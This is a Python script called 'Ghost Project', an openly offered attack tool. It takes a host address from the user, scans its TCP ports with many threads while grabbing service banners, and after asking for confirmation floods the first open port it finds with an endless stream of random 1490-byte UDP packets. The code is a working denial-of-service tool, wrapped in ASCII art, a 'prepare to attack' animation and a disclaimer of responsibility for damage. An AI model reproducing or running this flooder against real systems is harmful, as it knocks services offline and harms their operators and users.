import os
import sys
import time
import random
import socket
import itertools
import threading
from datetime import datetime
from threading import Event, Lock
import concurrent.futures

COMMON_PORTS = [80, 443, 22, 21, 25, 110, 143, 53, 3306, 3389, 8080]
done = False

def ghost():
    print()
    print(r"              ...                             ")
    time.sleep(0.03)
    print(r"             ;::::;                           ")
    time.sleep(0.03)
    print(r"           ;::::; :;                          ")
    time.sleep(0.03)
    print(r"         ;:::::'   :;                         ")
    time.sleep(0.03)
    print(r"        ;:::::;     ;.                        ")
    time.sleep(0.03)
    print(r"       ,:::::'       ;           OOO\         ")
    time.sleep(0.03)
    print(r"       ::::::; X   X ;          OOOOO\        ")
    time.sleep(0.03)
    print(r"       ;:::::;       ;         OOOOOOOO       ")
    time.sleep(0.03)
    print(r"      ,;::::::;     ;'         / OOOOOOO      ")
    time.sleep(0.03)
    print(r"    ;:::::::::`. ,,,;.        /  / DOOOOOO    ")
    time.sleep(0.03)
    print(r"  .';:::::::::::::::::;,     /  /     DOOOO   ")
    time.sleep(0.03)
    print(r" ,::::::;::::::;;;;::::;,   /  /        DOOO  ")
    time.sleep(0.03)
    print(r";`::::::`'::::::;;;::::: ,#/  /          DOOO ")
    time.sleep(0.03)
    print(r":`:::::::`;::::::;;::: ;::#  /            DOOO")
    time.sleep(0.03)
    print(r"::`:::::::`;:::::::: ;::::# /              DOO")
    time.sleep(0.03)
    print(r"`:`:::::::`;:::::: ;::::::#/               DOO")
    time.sleep(0.03)
    print(r" :::`:::::::`;; ;:::::::::##                OO")
    time.sleep(0.03)
    print(r" ::::`:::::::`;::::::::;:::#                OO")
    time.sleep(0.03)
    print(r" `:::::`::::::::::::;'`:;::#                O ")
    time.sleep(0.03)
    print(r"  `:::::`::::::::;' /  / `:#                  ")
    time.sleep(0.03)
    print(r"   ::::::`:::::;'  /  /   `# Author : Drastria")
    time.sleep(0.03)
    print(r"==============================================")
    time.sleep(0.03)
    print(r"=               Ghost Project                =")
    time.sleep(0.03)
    print(r"==============================================")
    time.sleep(0.03)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def sanitize_host(target):
    target = target.strip()
    if target.startswith("http://"):
        target = target.replace("http://", "", 1)
    elif target.startswith("https://"):
        target = target.replace("https://", "", 1)
    if "/" in target:
        target = target.split("/")[0]
    return target

def resolve_host(host):
    infos = socket.getaddrinfo(host, None, family=socket.AF_UNSPEC, type=socket.SOCK_STREAM)
    for info in infos:
        af, socktype, proto, canonname, sockaddr = info
        if af == socket.AF_INET:
            return af, sockaddr[0]
    af, socktype, proto, canonname, sockaddr = infos[0]
    return af, sockaddr[0]

def scan_one(addr_family, ip, port, timeout, stop_event):
    if stop_event.is_set():
        return (port, False, None)
    try:
        with socket.socket(addr_family, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            res = s.connect_ex((ip, port))
            if res == 0:
                banner = None
                try:
                    s.settimeout(0.3)
                    banner = s.recv(1024).decode(errors='ignore').strip()
                except Exception:
                    banner = None
                return (port, True, banner)
    except Exception:
        pass
    return (port, False, None)

def port_generator():
    seen = set()
    for p in COMMON_PORTS:
        if 1 <= p <= 65535 and p not in seen:
            seen.add(p)
            yield p
    for p in range(1, 65536):
        if p not in seen:
            yield p

def auto_scan_until_found(host, timeout=0.4, max_workers=100, wanted_open_ports=1, verbose=False):
    clear_screen()
    ghost()
    host = sanitize_host(host)

    try:
        af, ip = resolve_host(host)
    except Exception as e:
        print(f"Failed to resolve host '{host}': {e}")
        return []

    print(f"Host {host} -> IP {ip}")
    print(f"Starting automatic scan to find {wanted_open_ports} open port...")

    stop_event = Event()
    found_list = []
    found_lock = Lock()

    port_iter = port_generator()
    start_time = datetime.now()

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {}
        try:
            for _ in range(max_workers):
                try:
                    port = next(port_iter)
                except StopIteration:
                    break
                fut = executor.submit(scan_one, af, ip, port, timeout, stop_event)
                futures[fut] = port

            while futures and not stop_event.is_set():
                done, _ = concurrent.futures.wait(futures.keys(), return_when=concurrent.futures.FIRST_COMPLETED)
                for fut in done:
                    port = futures.pop(fut)
                    try:
                        port, is_open, banner = fut.result()
                    except Exception:
                        continue

                    if is_open:
                        with found_lock:
                            found_list.append({
                                "ip": ip,
                                "port": port,
                                "banner": banner
                            })
                        print()
                        print(f"Information")
                        time.sleep(0.3)
                        print(f"IP     : {ip}")
                        time.sleep(0.3)
                        print(f"PORT   : {port}")
                        time.sleep(0.3)
                        print(f"Banner : {banner}")
                        time.sleep(0.3)
                        if len(found_list) >= wanted_open_ports:
                            stop_event.set()
                            break
                    else:
                        if verbose:
                            print(f"[..] {ip}:{port} closed")
                    if not stop_event.is_set():
                        try:
                            next_port = next(port_iter)
                            fut2 = executor.submit(scan_one, af, ip, next_port, timeout, stop_event)
                            futures[fut2] = next_port
                        except StopIteration:
                            pass

        except KeyboardInterrupt:
            print("\nConnection terminated")
            time.sleep(0.2)
            stop_event.set()

    elapsed = (datetime.now() - start_time).total_seconds()
    print(f"\nFinished in {elapsed:.2f}s.")
    time.sleep(0.2)
    print(f"Found {len(found_list)} open port")
    return found_list

def attack(ip, port):

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)
    clear_screen()
    ghost()
    start_animation()
    time.sleep(3)
    stop_animation()
    print(f"Attack in progress on {ip}:{port}")
    sent = 0
    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            print(f"Sent {sent} packet to {ip} through port:{port}", end='\r')
            
            if port >= 65534:
                port = 1
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except socket.gaierror:
        print("\nError: IP address or hostname is invalid.")
    except Exception as e:
        print(f"\nAn unexpected error occurred: {e}")

def animate():
    text = 'Prepare to attack '
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\r' + text + c + '   ')
        sys.stdout.flush()
        time.sleep(0.1)

    sys.stdout.write('\r' + ' ' * (len(text) + 5) + '\r')
    sys.stdout.flush()

def start_animation():
    global done, t
    done = False
    t = threading.Thread(target=animate)
    t.start()

def stop_animation():
    global done, t
    done = True
    try:
        if 't' in globals() and isinstance(t, threading.Thread) and t.is_alive():
            t.join(timeout=1)
    except Exception:
        pass

if __name__ == "__main__":
    try:
        ghost()
        print(r"The authors take no responsibility for")
        time.sleep(0.03)
        print(r"any damage caused by this tool.")
        time.sleep(0.03)
        print()
        target = input("Enter host address : ").strip()
        results = auto_scan_until_found(target, timeout=0.4, max_workers=120, wanted_open_ports=1, verbose=False)

        if not results:
            print("No open ports found")
            sys.exit(0)

        for item in results:
            ip = item['ip']
            port = item['port']

        print()
        lanjutkan = input("Do you want to start the attack? (yes/no): ").strip().lower()

        if lanjutkan in ('yes', 'ya', 'y', 'yeah', 'yo'):
            attack(ip, port)
        else:
            print("\nVanishing into the void...")
            time.sleep(0.5)

    except KeyboardInterrupt:
        print("\nMission aborted, returning to the shadows")
        time.sleep(0.5)
        stop_animation()
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
